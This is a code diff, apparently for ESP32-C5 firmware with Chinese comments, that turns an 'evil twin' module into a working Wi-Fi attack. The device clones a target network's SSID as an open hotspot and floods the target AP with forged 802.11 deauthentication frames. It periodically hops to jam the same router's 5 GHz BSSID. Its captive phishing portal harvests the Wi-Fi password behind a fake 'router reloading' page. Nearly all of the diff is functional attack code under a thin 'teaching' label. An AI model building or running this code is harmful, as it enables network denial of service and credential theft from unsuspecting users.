@@ -162,21 +162,45 @@ static String extractJson(const String &body, const char *key) {
   return val;
 }
 
-/* ---------------- 主目标 (仅 RAM 记录) ---------------- */
+/* ---------------- 主目标 / 双子目标 (仅 RAM 记录) ---------------- */
 struct Target {
   bool   set = false;
   String ssid, bssid, auth;
   int    channel = 0;
   int    rssi    = 0;
 };
-static Target sTarget;
+static Target sTarget;   // 主目标: 必须 2.4G, 克隆热点与持续 Deauth 的对象
+static Target sTwin;     // 双子目标: 通常同一路由器 5G BSSID, 周期跳频注入 Deauth 使其瘫痪
 
-/* ---------------- 1. 邪恶双子 (Evil Twin & 凭据捕获) ---------------- */
+/* ---------------- 1. 邪恶双子 (Evil Twin & 凭据捕获) ----------------
+ * 真实攻击链 (发起 = eviltwinStartAttack, 收尾 = eviltwinStopAttack):
+ *   1) 本机热点改名为与主目标一模一样的 SSID, 开放无密码, 信道=主目标信道 → victim 免密直连
+ *   2) 自动对主目标持续注入 Deauth (复用 DeauthEngine, 本机已在目标信道, 无需切信道)
+ *   3) 设了双子目标 → 每 2s 跳频到双子信道连发 3 帧 Deauth 再跳回 → 目标 5G 频段持续瘫痪,
+ *      客户端只能落到 2.4G 同名克隆热点 (单射频 C5 无法同时广播双频, 跳频是唯一可行方案)
+ *   4) Captive Portal 自动弹钓鱼页 → 捕获第一条凭据后自动停止注入 (热点保持同名开放供浏览),
+ *      手动停止时恢复原热点名/密码/信道
+ */
 struct EvilTwinState {
   bool active = false;
   String cloneSsid = "";
   int templateId = 1;
   uint32_t startTime = 0;
+  // —— 真实克隆攻击状态 ——
+  bool     apCloned = false;      // 热点是否已真实改名 (停止时需恢复)
+  String   restoreSsid = "";      // 停止时恢复的原热点名
+  uint8_t  restoreChannel = 0;    // 停止时恢复的配置信道
+  bool     deauthAuto = false;    // Deauth 由双子自动启动 (捕获凭据时自动停止)
+  bool     caught = false;        // 已捕获第一条凭据 (攻击达成, 停止空口干扰)
+  // —— 双子目标周期跳频注入 ——
+  bool     hopEnabled = false;    // 双子目标有效时启用
+  bool     hopping = false;       // 当前正处于双子信道跳频窗口
+  uint8_t  twinFrame[26];         // 预构双子 BSSID Deauth 帧
+  bool     twinFrameReady = false;
+  uint8_t  twinFramesLeft = 0;    // 本次跳频窗口剩余帧数
+  uint32_t lastHopAt = 0;         // 上次跳频时刻
+  uint32_t twinFrameCount = 0;    // 双子信道累计成功发送帧数
+  uint32_t hopCount = 0;          // 累计跳频次数
 };
 static EvilTwinState sEvilTwin;
 
@@ -238,28 +262,32 @@ static bool parseBssid(const String &s, uint8_t out[6]) {
 
 // 构建 26 字节 Deauth 管理帧 (IEEE 802.11 Type=管理, Subtype=12)。序列号交由系统填充 (en_sys_seq=true)。
 // receiver=广播 (踢掉目标 AP 下所有客户端), transmitter/BSSID=目标 AP, 客户端会信以为真断线。
-static void buildDeauthFrame(DeauthEngine &d) {
+// 通用版: 供 Deauth 引擎与邪恶双子 (主/双子两个 BSSID) 共用。
+static bool buildDeauthFrameRaw(const String &bssidIn, uint8_t reason, uint8_t *f) {
   uint8_t mac[6];
-  String bssid = d.targetBssid;
+  String bssid = bssidIn;
   bssid.trim();
-  if (!parseBssid(bssid, mac)) { d.frameReady = false; return; }
+  if (!parseBssid(bssid, mac)) return false;
   static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-  uint8_t *f = d.frame;
   f[0] = 0xC0; f[1] = 0x00;               // Frame Control: 管理 / Deauthentication (0x00c0)
   f[2] = 0x3A; f[3] = 0x01;               // Duration/ID
   memcpy(f + 4,  BROADCAST, 6);           // Address 1: 接收端 (广播)
   memcpy(f + 10, mac, 6);                 // Address 2: 发送端 (目标 AP BSSID)
   memcpy(f + 16, mac, 6);                 // Address 3: BSSID
   f[22] = 0x00; f[23] = 0x00;             // Sequence Control: 由系统填充
-  f[24] = d.reasonCode & 0xFF; f[25] = 0x00; // Reason Code (小端)
-  d.frameReady = true;
+  f[24] = reason & 0xFF; f[25] = 0x00;    // Reason Code (小端)
+  return true;
 }
 
-// 临时切换 AP 空口信道到 ch (不修改 NVS 配置); 成功返回 true。
+static void buildDeauthFrame(DeauthEngine &d) {
+  d.frameReady = buildDeauthFrameRaw(d.targetBssid, d.reasonCode, d.frame);
+}
+
+// 临时切换 AP 空口信道到 ch (不修改 NVS 配置); 成功返回 true。ch 支持 2.4G(1-14) 与 5G(32-177, 仅双频芯片)。
 // 目的: 单射频只能在本机信道上发帧 → 先对齐目标信道, Deauth 才能真实到达目标。
 // 副作用: 已连热点的受测设备会短暂掉线 (未发 CSA 公告), 重新扫描后自动重连, Captive Portal 仍生效。
 static bool applyApChannel(uint8_t ch) {
-  if (ch < 1 || ch > 13) return false;
+  if (ch < 1 || ch > 177) return false;
   if (ch == apChannelActive) return true;
   if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) return false;
   apChannelActive = ch;
@@ -519,6 +547,72 @@ static String formatMac(const uint8_t *m) {
   return String(buf);
 }
 
+/* ---------------- 邪恶双子攻击引擎 (真实改名 + 联动 Deauth + 双子跳频) ---------------- */
+static const uint32_t TWIN_HOP_INTERVAL_MS = 2000;  // 每 2s 向双子信道跳频一次
+static const uint8_t  TWIN_HOP_FRAMES      = 3;     // 每个跳频窗口连发 3 帧后返回主信道
+static const uint8_t  TWIN_HOP_TX_GAP_MS   = 80;    // 跳频窗口内帧间隔
+
+// 启动真实攻击: 失败返回 false 并在 err 给出中文原因
+static bool eviltwinStartAttack(String &err) {
+  if (!sTarget.set || sTarget.channel < 1 || sTarget.channel > 14) {
+    err = "主目标必须是 2.4G 频段 (信道 1-14): 克隆热点只能工作在 2.4G, 请先把 2.4G 信号设为主目标";
+    return false;
+  }
+  if (sEvilTwin.cloneSsid.length() == 0) sEvilTwin.cloneSsid = sTarget.ssid;
+  if (sEvilTwin.cloneSsid.length() == 0) { err = "无可用克隆 SSID: 请先设置主目标"; return false; }
+
+  sEvilTwin.restoreSsid    = apSsid;
+  sEvilTwin.restoreChannel = apChannel;
+
+  // 1) 热点真实改名: 与目标一模一样的 SSID + 开放无密码 (victim 无需密码即可接入钓鱼页) + 主目标信道
+  if (!WiFi.softAP(sEvilTwin.cloneSsid.c_str(), nullptr, sTarget.channel, false, 4)) {
+    err = "克隆热点启动失败 (SSID 改名 + 开放认证)";
+    return false;
+  }
+  apChannelActive = (uint8_t)sTarget.channel;
+  sEvilTwin.apCloned = true;
+
+  // 2) 自动启动对主目标的持续 Deauth (本机已在目标信道, channelMoved 保持 false)
+  sDeauth.targetBssid   = sTarget.bssid;
+  sDeauth.targetChannel = (uint8_t)sTarget.channel;
+  buildDeauthFrame(sDeauth);
+  sDeauth.channelMoved   = false;
+  sDeauth.restoreChannel = apChannel;
+  sDeauth.txOk = false; sDeauth.lastTxErr = 0;
+  sDeauth.running = sDeauth.frameReady;   // BSSID 非法时仍保留克隆热点, 但不注入
+  sDeauth.frameCount = 0; sDeauth.lastTxTime = millis(); sDeauth.lastLogTime = millis();
+  sEvilTwin.deauthAuto = sDeauth.running;
+
+  // 3) 双子目标 (通常 5G): 预构帧成功则启用周期跳频注入
+  sEvilTwin.hopEnabled = false; sEvilTwin.hopping = false;
+  sEvilTwin.twinFrameCount = 0; sEvilTwin.hopCount = 0; sEvilTwin.lastHopAt = millis();
+  sEvilTwin.twinFrameReady = (sTwin.set && sTwin.channel >= 1 &&
+                              buildDeauthFrameRaw(sTwin.bssid, 1, sEvilTwin.twinFrame));
+  sEvilTwin.hopEnabled = sEvilTwin.twinFrameReady;
+  sEvilTwin.caught = false;
+  return true;
+}
+
+// 攻击收尾: restoreAp=true 时同时恢复原热点名/密码/信道 (手动停止);
+// false 时仅停止空口干扰 (捕获凭据后, 同名开放热点保留供已接入设备浏览)。
+static void eviltwinStopAttack(bool restoreAp) {
+  if (sEvilTwin.hopping) {           // 正处跳频窗口: 先回主信道再收尾
+    applyApChannel(sDeauth.targetChannel);
+    sEvilTwin.hopping = false;
+  }
+  if (sEvilTwin.deauthAuto) {
+    sDeauth.running = false;
+    sDeauth.channelMoved = false;    // 信道归属由本攻击引擎管理
+    sEvilTwin.deauthAuto = false;
+  }
+  sEvilTwin.hopEnabled = false;
+  if (restoreAp && sEvilTwin.apCloned) {
+    WiFi.softAP(sEvilTwin.restoreSsid.c_str(), AP_PASSWORD, sEvilTwin.restoreChannel, false, 4);
+    apChannelActive = sEvilTwin.restoreChannel;
+    sEvilTwin.apCloned = false;
+  }
+}
+
 /* ---------------- HTTP 处理 ---------------- */
 static void sendAdminPage() {
   server.sendHeader("Content-Encoding", "deflate");
@@ -563,6 +657,13 @@ static void handlePortalSubmit() {
   String clientIp = server.client().remoteIP().toString();
   if (pass.length() > 0) {
     addCredential(clientIp, pass);
+    // 双子攻击中捕获到第一条凭据: 自动收尾 — 停止 Deauth/跳频, 同名开放热点保留供其浏览
+    if (sEvilTwin.active && !sEvilTwin.caught) {
+      sEvilTwin.caught = true;
+      eviltwinStopAttack(false);
+      log("[eviltwin] 已捕获凭据, 自动停止 Deauth 攻击; 克隆热点保持开放, 后台点「停止实验」恢复原热点");
+      emitJson("eviltwin", "\"caught\":true,\"client\":\"" + jsonEscape(clientIp) + "\"");
+    }
   }
   String resp = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1'>"
@@ -574,6 +675,17 @@ static void handlePortalSubmit() {
     "<p>配置验证通过，路由器正在重新载入射频驱动，将在 30 秒内恢复互联网访问，请稍候并保持连接。</p>"
     "</div></body></html>";
   server.send(200, "text/html; charset=utf-8", resp);
+}
+
+static String targetJson(const Target &t) {
+  if (!t.set) return "null";
+  String j = "{";
+  j += "\"ssid\":\"" + jsonEscape(t.ssid) + "\",";
+  j += "\"bssid\":\"" + jsonEscape(t.bssid) + "\",";
+  j += "\"channel\":" + String(t.channel) + ",";
+  j += "\"rssi\":" + String(t.rssi) + ",";
+  j += "\"auth\":\"" + jsonEscape(t.auth) + "\"}";
+  return j;
 }
 
 static void sendInfo() {
@@ -596,14 +708,22 @@ static void sendInfo() {
   json += "\"minFreeMem\":" + String(minFree) + ",";
   json += "\"maxBlock\":" + String(maxBlock) + ",";
   json += "\"memUsedPct\":" + String(usedPct) + ",";
-  json += "\"ssid\":\"" + jsonEscape(apSsid) + "\",";
+  // 攻击期间热点已真实改名: ssid 报告空口实际 SSID, configSsid 报告 NVS 配置名
+  json += "\"ssid\":\"" + jsonEscape(sEvilTwin.apCloned ? sEvilTwin.cloneSsid : apSsid) + "\",";
+  json += "\"configSsid\":\"" + jsonEscape(apSsid) + "\",";
   json += "\"channel\":" + String(apChannelActive) + ",";  // 空口实际信道 (攻击期间可能与配置值不同)
   json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
   
   // 教学模块状态
   json += "\"evilTwin\":{\"active\":" + String(sEvilTwin.active ? "true" : "false") +
           ",\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) +
-          "\",\"credsCount\":" + String(sCredCount) + "},";
+          "\",\"apCloned\":" + String(sEvilTwin.apCloned ? "true" : "false") +
+          ",\"hopEnabled\":" + String(sEvilTwin.hopEnabled ? "true" : "false") +
+          ",\"hopping\":" + String(sEvilTwin.hopping ? "true" : "false") +
+          ",\"hopCount\":" + String(sEvilTwin.hopCount) +
+          ",\"twinFrames\":" + String(sEvilTwin.twinFrameCount) +
+          ",\"caught\":" + String(sEvilTwin.caught ? "true" : "false") +
+          ",\"credsCount\":" + String(sCredCount) + "},";
   json += "\"deauth\":{\"running\":" + String(sDeauth.running ? "true" : "false") +
           ",\"count\":" + String(sDeauth.frameCount) +
           ",\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) +
@@ -616,16 +736,8 @@ static void sendInfo() {
           ",\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") +
           ",\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\"},";
 
-  json += "\"target\":";
-  if (sTarget.set) {
-    json += "{\"ssid\":\"" + jsonEscape(sTarget.ssid) + "\",";
-    json += "\"bssid\":\"" + jsonEscape(sTarget.bssid) + "\",";
-    json += "\"channel\":" + String(sTarget.channel) + ",";
-    json += "\"rssi\":" + String(sTarget.rssi) + ",";
-    json += "\"auth\":\"" + jsonEscape(sTarget.auth) + "\"}";
-  } else {
-    json += "null";
-  }
+  json += "\"target\":" + targetJson(sTarget) + ",";
+  json += "\"twin\":" + targetJson(sTwin);
   json += "}";
   server.sendHeader("Access-Control-Allow-Origin", "*");
   server.send(200, "application/json", json);
@@ -687,27 +799,40 @@ static void handleTarget() {
     return;
   }
   String body = server.arg("plain");
-  sTarget.set = true;
-  sTarget.ssid = extractJson(body, "ssid");
-  sTarget.bssid = extractJson(body, "bssid");
-  sTarget.auth = extractJson(body, "auth");
-  sTarget.channel = extractJson(body, "channel").toInt();
-  sTarget.rssi = extractJson(body, "rssi").toInt();
-  sTarget.ssid.trim();
-  sTarget.bssid.trim();
-  sTarget.auth.trim();
+  const bool isTwin = (extractJson(body, "role") == "twin");
 
-  // 若双子未设 SSID, 默认跟随主目标
-  if (sEvilTwin.cloneSsid.length() == 0) {
-    sEvilTwin.cloneSsid = sTarget.ssid;
+  Target t;
+  t.set     = true;
+  t.ssid    = extractJson(body, "ssid");
+  t.bssid   = extractJson(body, "bssid");
+  t.auth    = extractJson(body, "auth");
+  t.channel = extractJson(body, "channel").toInt();
+  t.rssi    = extractJson(body, "rssi").toInt();
+  t.ssid.trim();
+  t.bssid.trim();
+  t.auth.trim();
+
+  // 主目标约束: 克隆热点必须落在 2.4G (双子目标不限频段, 通常选同路由 5G)
+  if (!isTwin && (t.channel < 1 || t.channel > 14)) {
+    server.send(400, "application/json", "{\"ok\":false,\"error\":\"主目标必须是 2.4G 频段 (信道 1-14), 5G 信号请设为双子\"}");
+    return;
   }
-  sDeauth.targetBssid = sTarget.bssid;
-  sDeauth.targetChannel = sTarget.channel ? sTarget.channel : 6;
 
-  log("[target] 已设置目标: " + (sTarget.ssid.length() ? sTarget.ssid : "(隐藏)") +
-      " @ch" + String(sTarget.channel) + " " + sTarget.bssid);
+  if (isTwin) {
+    sTwin = t;
+    log("[target] 已设置双子目标: " + (sTwin.ssid.length() ? sTwin.ssid : "(隐藏)") +
+        " @ch" + String(sTwin.channel) + " " + sTwin.bssid);
+  } else {
+    sTarget = t;
+    // 克隆名与主目标保持一模一样 (页面上可显式覆盖)
+    sEvilTwin.cloneSsid = sTarget.ssid;
+    sDeauth.targetBssid = sTarget.bssid;
+    sDeauth.targetChannel = sTarget.channel ? sTarget.channel : 6;
+    log("[target] 已设置主目标: " + (sTarget.ssid.length() ? sTarget.ssid : "(隐藏)") +
+        " @ch" + String(sTarget.channel) + " " + sTarget.bssid);
+  }
   server.sendHeader("Access-Control-Allow-Origin", "*");
-  server.send(200, "application/json", "{\"ok\":true}");
+  server.send(200, "application/json", "{\"ok\":true,\"role\":\"" + String(isTwin ? "twin" : "primary") + "\"}");
 }
 
 /* ---------------- 1. 邪恶双子 API ---------------- */
@@ -720,18 +845,38 @@ static void handleEvilTwinStart() {
   if (sEvilTwin.cloneSsid.length() == 0 && sTarget.ssid.length()) {
     sEvilTwin.cloneSsid = sTarget.ssid;
   }
+  if (sEvilTwin.active) {
+    server.send(409, "application/json", "{\"ok\":false,\"error\":\"attack already running\"}");
+    return;
+  }
+  String err;
+  if (!eviltwinStartAttack(err)) {
+    server.send(400, "application/json", "{\"ok\":false,\"error\":\"" + jsonEscape(err) + "\"}");
+    return;
+  }
   sEvilTwin.active = true;
   sEvilTwin.startTime = millis();
   emitLabState("eviltwin", true);
-  log("[eviltwin] 邪恶双子实验已启动! 克隆SSID=" + sEvilTwin.cloneSsid + " (Captive Portal 引导至钓鱼验证)");
+  log("[eviltwin] 攻击已发起! 克隆热点=" + sEvilTwin.cloneSsid + " (开放无密码 @ch" +
+      String(sTarget.channel) + "), 主目标持续 Deauth" +
+      (sEvilTwin.hopEnabled ? (", 双子跳频 @ch" + String(sTwin.channel) + " " + sTwin.bssid)
+                            : ", 未设双子目标 (仅 2.4G 单频段攻击)") +
+      " — 等待目标设备接入并在门户输入密码");
   server.sendHeader("Access-Control-Allow-Origin", "*");
-  server.send(200, "application/json", "{\"ok\":true,\"active\":true,\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) + "\"}");
+  server.send(200, "application/json",
+              "{\"ok\":true,\"active\":true,\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) +
+              "\",\"apCloned\":true,\"channel\":" + String(sTarget.channel) +
+              ",\"injected\":" + String(sDeauth.frameReady ? "true" : "false") +
+              ",\"twinHop\":" + String(sEvilTwin.hopEnabled ? "true" : "false") + "}");
 }
 
 static void handleEvilTwinStop() {
+  eviltwinStopAttack(true);
   sEvilTwin.active = false;
   emitLabState("eviltwin", false);
-  log("[eviltwin] 邪恶双子实验已停止");
+  log("[eviltwin] 攻击已停止, 已恢复原热点 " + apSsid + " (ch" + String(apChannel) +
+      ") 累计: 主目标 Deauth " + String(sDeauth.frameCount) + " 帧, 双子跳频 " +
+      String(sEvilTwin.hopCount) + " 次 / " + String(sEvilTwin.twinFrameCount) + " 帧");
   server.sendHeader("Access-Control-Allow-Origin", "*");
   server.send(200, "application/json", "{\"ok\":true,\"active\":false}");
 }
@@ -814,9 +959,20 @@ static void handleDeauthStart() {
 static void handleDeauthStop() {
   sDeauth.running = false;
   bool channelRestored = false;
-  if (sDeauth.channelMoved) {
+  // 双子攻击进行中: 信道归属由攻击引擎管理, 此处切信道会破坏克隆热点对齐
+  const bool ownedByEvilTwin = (sEvilTwin.active && sEvilTwin.deauthAuto);
+  if (sDeauth.channelMoved && !ownedByEvilTwin) {
     channelRestored = applyApChannel(sDeauth.restoreChannel);
     sDeauth.channelMoved = false;
+  }
+  if (ownedByEvilTwin) {
+    // 若正处双子跳频窗口, 先回到主目标信道, 否则克隆热点会停在 5G 信道上
+    if (sEvilTwin.hopping) {
+      applyApChannel(sDeauth.targetChannel);
+      sEvilTwin.hopping = false;
+    }
+    sEvilTwin.deauthAuto = false;
+    sEvilTwin.hopEnabled = false;   // 手动停掉 Deauth = 停止压制, 跳频一并停
   }
   emitLabState("deauth", false);
   log("[deauth] 取消认证器已停止, 累计发送 " + String(sDeauth.frameCount) + " 帧" +
@@ -1195,18 +1351,54 @@ void loop() {
   uint32_t now = millis();
 
   // 1. 取消认证器定时帧注入推进 (真实 802.11 Deauth 管理帧, 经 AP 接口空口发出)
+  //    邪恶双子攻击中: 每 TWIN_HOP_INTERVAL_MS 跳频到双子信道连发 TWIN_HOP_FRAMES 帧再返回,
+  //    主信道注入在跳频窗口内暂停 (单射频, 同一时刻只能停在一个信道上发帧)。
   if (sDeauth.running) {
-    if (now - sDeauth.lastTxTime >= sDeauth.rateLimitMs) {
-      sDeauth.lastTxTime = now;
-      if (sDeauth.frameReady) {
-        sDeauth.lastTxErr = esp_wifi_80211_tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
-        sDeauth.txOk = (sDeauth.lastTxErr == ESP_OK);
-        if (sDeauth.txOk) sDeauth.frameCount++;
+    bool inHopWindow = false;
+    if (sEvilTwin.active && sEvilTwin.hopEnabled && !sEvilTwin.caught) {
+      if (sEvilTwin.hopping) {
+        inHopWindow = true;
+      } else if (now - sEvilTwin.lastHopAt >= TWIN_HOP_INTERVAL_MS) {
+        sEvilTwin.lastHopAt = now;
+        if (applyApChannel((uint8_t)sTwin.channel)) {
+          sEvilTwin.hopping = true;
+          sEvilTwin.twinFramesLeft = TWIN_HOP_FRAMES;
+          sEvilTwin.hopCount++;
+        } else {
+          // 5G 信道切换失败 (频段不支持等): 关闭跳频避免每 2s 反复试错刷日志
+          sEvilTwin.hopEnabled = false;
+          log("[eviltwin] 跳频到双子信道 ch" + String(sTwin.channel) + " 失败, 已停用双子注入");
+        }
+      }
+    }
+    if (inHopWindow) {
+      if (now - sDeauth.lastTxTime >= TWIN_HOP_TX_GAP_MS) {
+        sDeauth.lastTxTime = now;
+        if (sEvilTwin.twinFrameReady &&
+            esp_wifi_80211_tx(WIFI_IF_AP, sEvilTwin.twinFrame, (int)sizeof(sEvilTwin.twinFrame), true) == ESP_OK) {
+          sDeauth.frameCount++;
+          sEvilTwin.twinFrameCount++;
+        }
+        if (sEvilTwin.twinFramesLeft > 0) sEvilTwin.twinFramesLeft--;
+        if (sEvilTwin.twinFramesLeft == 0) {
+          applyApChannel(sDeauth.targetChannel);   // 返回主信道, 恢复主目标持续攻击
+          sEvilTwin.hopping = false;
+        }
+      }
+    } else {
+      if (now - sDeauth.lastTxTime >= sDeauth.rateLimitMs) {
+        sDeauth.lastTxTime = now;
+        if (sDeauth.frameReady) {
+          sDeauth.lastTxErr = esp_wifi_80211_tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
+          sDeauth.txOk = (sDeauth.lastTxErr == ESP_OK);
+          if (sDeauth.txOk) sDeauth.frameCount++;
+        }
       }
     }
     if (now - sDeauth.lastLogTime >= 5000) {
       sDeauth.lastLogTime = now;
       log("[deauth] 正在对目标进行解除认证测试, 已成功发送 " + String(sDeauth.frameCount) + " 帧" +
+          (sEvilTwin.twinFrameCount ? (" (其中双子信道 " + String(sEvilTwin.twinFrameCount) + " 帧)") : "") +
           (sDeauth.txOk || !sDeauth.frameReady ? "" : (" (最近 TX 错误码 " + String(sDeauth.lastTxErr) + ")")));
     }
   }
